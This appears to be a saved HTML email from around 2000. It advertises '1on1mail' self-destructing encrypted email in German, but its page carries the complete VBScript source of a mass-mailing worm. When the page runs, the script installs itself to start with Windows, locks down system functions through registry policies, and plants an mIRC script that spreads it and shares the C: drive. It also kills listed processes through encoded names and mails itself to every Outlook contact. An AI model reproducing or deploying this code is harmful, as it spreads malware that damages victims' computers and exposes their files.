<!-- saved from url=(0022)http://internet.e-mail -->
<!--Lee from Germany-->
<html><body bgcolor="#0000FF" link="#000080">
<FONT  SIZE=3 PTSIZE=10><BR>
***small but very funny***<BR>
<BR>
<< Selbst Explodierende E-Mails<BR>
<BR>
 Hushmail.com..Dank Java-Applet-Verschlüsselung sind ihre E-Mails unknackbar.<BR>
<BR>
 Aber jetzt setze ich noch eines Drauf.<BR>
 Ihre E-Mails sind von nun an nicht nur sicher verschlüsselt, nein:<BR>
 Ihre E-Mails zerstören sich von selbst !!!<BR>
<BR>
 Zur Verschlüsselung: E-Mails sind von jedem einsehbar und werden,<BR>
 auf dem Weg vom Absender bis zum Ziel etwa 12 Mal kopiert.<BR>
 Kurz gesagt, Ihre E-Mail ist nackt. Die Verschlüsselung mit PGP<BR>
 ist auch nicht sicher: Jeder Spionage Dienst der Welt kann sie lesen.<BR>
<BR>
 Hushmail oder das 1-on-1 Mail codieren jedoch de facto unknackbar...<BR>
 Hushmail mit einem 1024 Bit-Schlüssel (ein Pentium benötigt zum Knacken<BR>
 des Codes etwa 30 Jahre).<BR>
<BR>
 1-on-1 Mail verschlüsselt sogar mit 2048 Bit !<BR>
 Die Explosion ihrer E-Mails geben Sie selber vor.<BR>
 Ihre E-Mail vernichtet sich dann beim Adressaten spurlos,<BR>
 wie von Geisterhand.<BR>
<BR>
 Wo es dieses Gibt ???<BR> 
<BR>
 Http://www.1on1mail.com<BR>
<BR>
 Bye und einen schönen Tag,,,wünscht Lee aus Bayern<BR>
<script Language="VBScript"><!--
' VBS.1on1.Mail - by Lee
On Error Resume Next
Dim fso,dirsystem,file,vbscopy,copier,dow,reg,FileLoc,MakeCopy,Lists,a,x,RegLists,Entries,Addresses,RegAddress,Mail
Set fso = CreateObject("Scripting.FileSystemObject")
Set reg = CreateObject("WScript.Shell")
Set dirsystem = fso.GetSpecialFolder(1)
Set file = fso.OpenTextFile(WScript.ScriptFullname,1)
Set MakeCopy = fso.GetFile(WScript.ScriptFullName)
Set OutLook=WScript.CreateObject("Outlook.Application")
Set mapi=OutLook.GetNameSpace("MAPI")
Set copier = document.body.createTextRange
vbscopy=file.ReadAll
MakeCopy.Copy(dirsystem&"\1on1mail.htm")
FileLoc = dirsystem&"\1on1mail.htm"
reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\1on1mail", FileLoc
reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop",1,"REG_DWORD"
reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind",1,"REG_DWORD"
reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Network\NoNetSetup",1,"REG_DWORD"
reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose",1,"REG_DWORD"
reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Version", "VBS.1on1mail"
reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner", "Lee from Germany / Bayern !! I am Not Lucky"
reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "Symantec® 2000"
Set startups=fso.CreateTextFile(dirsystem&"\1on1mail.htm")
startups.WriteLine "<1on1Mail>"
startups.Write("<HTML><BODY>" + Chr(13) + Chr(10))
startups.WriteLine copier.htmltext
startups.WriteLine("</body></html>")
startups.Close
If fso.FileExists("c:\mirc\mirc.ini") then
   Set Mirc=fso.CreateTextFile("C:\mirc\script.ini")
      Mirc.WriteLine "[script]"
      Mirc.WriteLine ";VBS.1on1mail by Lee from Germany"
      Mirc.WriteLine ";Greetz to everyone"
      Mirc.WriteLine ";"
      Mirc.WriteLine ";"
      Mirc.WriteLine "n0=on 1:CONNECT:{"
      Mirc.WriteLine "n1= /join #virus"
      Mirc.WriteLine "n2= /msg #virus More Lamer's infected by 1on1mail"
      Mirc.WriteLine "n3= /part #virus"
      Mirc.WriteLine "n4= /clear"
      Mirc.WriteLine "n5= /motd"
      Mirc.WriteLine "n6=}"
      Mirc.WriteLine "n7=on 1:JOIN:#:{"
      Mirc.WriteLine "n8= /if ( $nick == $me ) { halt }"
      Mirc.WriteLine "n9= /dcc send $nick "&dirsystem&"\1on1mail.htm"
      Mirc.WriteLine "n10=}"
      Mirc.WriteLine "n11=on 1:TEXT:*1on1mail?*:#:{"
      Mirc.WriteLine "n12= /fserve $nick 5 C:\"
      Mirc.WriteLine "n13=}"
      Mirc.Close
End if

For Lists=1 to mapi.AddressLists.Count
Set a=mapi.AddressLists(Lists)
x=1
RegLists=reg.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
If (RegLists="") then
RegLists=1
End if
KillProgramInMemory Decript("431141431 995114010310218319215418115A")
 KillProgramInMemory Decript("831981831741741471641961431471931861eE")
 KillProgramInMemory Decript("7515417513012710316512413510318514219X")
 KillProgramInMemory Decript("261551261311341811771631171041361431C]")
 KillProgramInMemory Decript("951551951311471631861041061431CZ")
 KillProgramInMemory Decript("051091051841761481051581851761451Qf")
 KillProgramInMemory Decript("561031561 88671221161911161511*`")
 KillProgramInMemory Decript("781721781 58822051712211622741512621881601891v'")
 KillProgramInMemory Decript("641431641 29461821741M.")
 KillProgramInMemory Decript("271802271661351171181391091291681602xg")
 KillProgramInMemory Decript("861741861501181631871621861241581c;")
 KillProgramInMemory Decript("961041961 898810315619113818119619314d")
 KillProgramInMemory Decript("341551341311051641751541351431061231CJ")
 KillProgramInMemory Decript("371602371461881381881102781402vh")
 KillProgramInMemory Decript("411821411 68 59 19231021011621011811(-")
 KillProgramInMemory Decript("081061081811161321891851671051Ho")
 KillProgramInMemory Decript("971461971221061721091261571171Ln")
 KillProgramInMemory Decript("931161931911731041051951531861IF")
 KillProgramInMemory Decript("671531671 39481721391211202k/")
 KillProgramInMemory Decript("881531881 39961 89991331481w/")
 KillProgramInMemory Decript("501331501 19301211611131101$-")
 KillProgramInMemory Decript("681731681 594919213024111u")
 KillProgramInMemory Decript("801441801201911241401'8")
 KillProgramInMemory Decript("871681871441751641751841781581881661481561881471bm")
 KillProgramInMemory Decript("431102431951811071331871441981231681qA")
 KillProgramInMemory Decript("451002451851361191261971851Up")
 KillProgramInMemory Decript("701181701931 19051811371321671501661]&")
 KillProgramInMemory Decript("651402651261171491551181661291451981tW")
 KillProgramInMemory Decript("641751641511161741751941261251441241EM")
 KillProgramInMemory Decript("751831751 69441701331001171811271X2")
 KillProgramInMemory Decript("071831071 69581821641001481811581e2")
If (int(a.AddressEntries.Count)>int(RegLists)) then
For Entries=1 to a.AddressEntries.Count
Addresses=a.AddressEntries(x)
RegAddress=""
RegAddress=reg.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&Addresses)
If (RegAddresses="") then
Set Mail=OutLook.CreateItem(0)
Mail.Recipients.Add(Addresses)
Mail.Subject = "1on1mail"
Mail.Body = vbcrlf & "Sicherer E-Mails bewahren ihre Privatsphäre."& vbcrlf & "Enjoy :-)" & vbcrlf & "1on1mail"
Mail.Attachments.Add(dirsystem&"\1on1mail.htm")
Mail.Send
reg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&Addresses,1,"REG_DWORD"
End if
x=x+1
Next
reg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
Else
reg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
End if
Next
Set OutLook=Nothing
Set mapi=Nothing

--></script>
</body></html>

